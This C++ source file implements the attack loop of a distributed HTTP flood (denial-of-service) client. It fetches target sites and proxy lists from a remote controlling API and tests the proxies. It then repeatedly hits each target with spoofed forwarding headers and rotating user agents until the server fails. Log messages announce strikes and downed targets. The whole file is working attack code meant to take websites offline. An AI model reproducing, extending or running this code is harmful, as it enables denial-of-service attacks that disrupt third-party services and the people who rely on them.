#include <thread>
#include <chrono>

#include "nlohmann/json.hpp"

#include "config.h"
#include "attacker.h"
#include "curl_wrapper.h"
#include "utils.h"

void HTTPFire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
{
	CURLLoader wrapper;

	std::string currentTarget{""};
	std::pair<std::string, std::string> currentProxy;

	bool isProxyValid{false};
	
	size_t currentProxyAttacks{0};

	size_t proxyLoadTries{0};

	// Trying to get api response
	while(!shouldStop.load())
	{
		nlohmann::json apiData;
		while(true)
		{
			wrapper.SetTarget(ChoseAPI(apiList));
			auto resp = wrapper.Download();
			if(resp && resp->m_code >= 200 && resp->m_code < 300)
			{
				resp->m_data.push_back('\0');
				try
				{
					apiData = nlohmann::json::parse(resp->m_data.data());
				}
				catch(...)
				{
					std::cerr << "Failed to parse API response" << std::endl;
					std::cout.write(resp->m_data.data(), resp->m_data.size());
					continue;
				}
				break;
			}
		}

		if(apiData.empty())
		{
			break;
		}

		// We should change targe only if we bombarder the first one
		if(currentTarget.empty())
		{
			try
			{
				currentTarget = decodeURL(apiData["site"]["url"]);
			}
			catch(...)
			{
				currentTarget = "";
				break;
			}
		}

		// Probing proxies
		if(!isProxyValid)
		{
			wrapper.SetTarget(currentTarget);

			for(auto proxy : apiData["proxy"])
			{
				std::string proxyIP = proxy["ip"];
				std::string proxyAuth{""};

				try
				{
					proxyAuth = proxy["auth"];
				}
				catch(...)
				{
				}

				if(const auto index = proxyIP.find("\r");
					index != std::string::npos)
				{
					proxyIP.erase(index, 1);
				}

				const auto respCode = wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS);
				if(respCode >= 200 && respCode < 300)
				{
					currentProxy = {std::move(proxyIP), std::move(proxyAuth)};
					currentProxyAttacks = 0;
					isProxyValid = true;

					// std::cout << "Found valid proxy looking for target" << std::endl;
					break;
				}
				else if(respCode >= 500)
				{
					std::cout << "Server" << currentTarget << " probably down";
					break;
				}
				else if(shouldStop.load())
				{
					break;
				}
				else
				{
					std::cerr << "Proxy: " << proxyIP << " failed" << std::endl;
				}
			}

			if(!isProxyValid)
			{
				std::cerr << "No valid proxy found, trying to get others" << std::endl;
				continue;
			}
		}

		if(!isProxyValid)
		{
			continue;
		}
		// Probing target
		Headers headers{
			{"Content-Type", "*/*"},
			{"Cf-Visitor", "https"},
			{"User-Agent", ChoseUseragent()},
			{"Connection", "keep-alive"},
			{"Accept", "application/json, text/plain, */*"},
			{"Accept-Language", "ru"},
			{"Accept-Encoding", "gzip, deflate, br"},
			{"X-Forwarded-Proto", "https"},
			{"X-Forwarder-For", currentProxy.first},
			{"Cache-Control", "no-store"}
		};

		wrapper.SetHeaders(headers);

		wrapper.SetTarget(currentTarget);
		const long targetRespCode = wrapper.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS);
		if(targetRespCode >= 200 && targetRespCode < 400)
		{
			std::cout << "LOCK AND LOAD, READY TO STRIKE " << currentTarget << "!" << std::endl;
		}
		else
		{
			currentTarget = "";
			// std::cout << "Something is blocking the way, looking for target" << std::endl;
			continue;
		}

		// Attacking
		for(; currentProxyAttacks < ProxyConfig::MAX_PROXY_ATTACKS && 
				!shouldStop.load(); currentProxyAttacks++)
		{
			UpdateHeaders(headers, currentProxy.first);
			wrapper.SetHeaders(headers);

			const long respCode = wrapper.Ping(20);
			if(respCode >= 200 && respCode < 300)
			{
				std::cout << "Succesfuly attacked!" << std::endl;
			}
			else if(respCode >= 500)
			{
				std::cout << "Target: " << currentTarget << " is down, looking for others" << std::endl;
				currentTarget = "";
				break;
			}
		}

		if(currentProxyAttacks >= ProxyConfig::MAX_PROXY_ATTACKS)
		{
			std::cout << "Current proxy exhausted, looking for other" << std::endl;
		}
	}
}
